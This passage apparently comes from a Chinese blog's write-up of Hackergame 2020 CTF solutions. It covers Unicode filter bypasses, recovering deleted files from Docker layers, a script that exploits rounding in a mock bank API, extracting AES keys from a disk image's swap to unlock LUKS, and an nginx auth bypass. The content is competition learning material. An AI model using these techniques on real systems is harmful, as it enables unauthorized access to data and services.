class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span 